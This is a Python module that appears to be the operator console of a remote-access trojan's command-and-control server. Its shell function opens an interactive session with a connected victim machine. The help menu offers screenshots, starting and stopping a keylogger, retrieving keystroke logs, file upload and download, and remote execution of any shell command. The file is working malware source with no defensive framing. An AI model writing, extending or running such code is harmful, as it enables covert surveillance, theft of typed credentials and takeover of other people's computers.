from .communication import send_data, recv_data
from .logging_config import logging
from .state import client_info_map
from pystyle import Colors, Colorate

def shell(session_id):
    target_info = None
    for info in client_info_map.values():
        if info['session_id'] == session_id:
            target_info = info
            break
    if not target_info:
        logging.error(f"No active session with ID {session_id}", extra={'session_id': session_id})
        print(f"{Colors.red}[!] No active session with ID {session_id}.{Colors.reset}")
        return
    target_socket = target_info['socket']
    client_display_name = f"{target_info.get('user', 'Unknown')}@{target_info.get('hostname', target_info['ip_str'])}"
    logging.info(f"Starting shell interaction with session {session_id} ({client_display_name})", extra={'session_id': session_id})
    print(f"\n{Colors.cyan}[*] Interacting with session {session_id} ({client_display_name}). Type 'help' for session commands.{Colors.reset}")

    while True:
        try:
            raw_command = input(f"{Colors.yellow}Shell Session {session_id} ({client_display_name}) > {Colors.reset}")
            command_parts = raw_command.strip().split(" ", 1)
            base_cmd = command_parts[0].lower()
            args = command_parts[1] if len(command_parts) > 1 else ""
            if not base_cmd:
                continue
            if base_cmd == 'help':
                print(Colorate.Vertical(Colors.red_to_purple, """
**** SHELL COMMANDS MENU ****

  help
      Description: Show this shell commands menu.
  bg / background / q / exit_shell
      Description: Return to main server menu (session remains active).
  kill_client
      Description: Terminate the client program for this session.
  sysinfo
      Description: Get detailed system information from the client.
  screenshot
      Description: Take a screenshot on the client.
  keylog_start
      Description: Start keylogger on the client.
  keylog_stop
      Description: Stop keylogger on the client.
  get_keylogs
      Description: Retrieve keylogs from the client.
  upload <filename>
      Description: Upload a file to the client.
  download <filename>
      Description: Download a file from the client.
  cd <dir>
      Description: Change directory on the client.
  ls
      Description: List directory contents on the client.
  pwd
      Description: Print working directory on the client.
  Any other shell command supported by the client's OS will be executed remotely.

""", 2))
                continue
            elif base_cmd in ['bg', 'background', 'q', 'exit_shell']:
                print(f"{Colors.cyan}[*] Returning to main server menu. Session {session_id} remains active.{Colors.reset}")
                break
            elif base_cmd == 'kill_client':
                print(f"{Colors.red}[!] Sending kill command to client session {session_id}...{Colors.reset}")
                send_data(target_socket, {"cmd": "kill_client"})
                print(f"{Colors.yellow}[*] Client program for session {session_id} should terminate.{Colors.reset}")
                return
            else:
                send_data(target_socket, {"cmd": base_cmd, "args": args})
                response = recv_data(target_socket)
                if response is None:
                    print(f"{Colors.red}[!] Session {session_id} appears to have disconnected.{Colors.reset}")
                    break
                if isinstance(response, dict):
                    if response.get("type") == "cmd_result":
                        print(f"{Colors.green}{response.get('output', 'No output received.')}{Colors.reset}")
                    elif response.get("type") == "sysinfo_result":
                        if "data" in response:
                            print(f"{Colors.light_blue}--- System Information for Session {session_id} ---{Colors.reset}")
                            for key, value in response["data"].items():
                                print(f"{Colors.cyan}{key.replace('_', ' ').title()}: {Colors.light_green}{value}{Colors.reset}")
                            print(f"{Colors.light_blue}--- End System Information ---{Colors.reset}")
                        else:
                            print(f"{Colors.red}Sysinfo error: {response.get('error', 'Unknown error')}{Colors.reset}")
                else:
                    print(f"{Colors.yellow}Received raw/non-JSON response: {response}{Colors.reset}")
        except Exception as e:
            logging.error(f"Error in shell for session {session_id}: {e}", extra={'session_id': session_id})
            break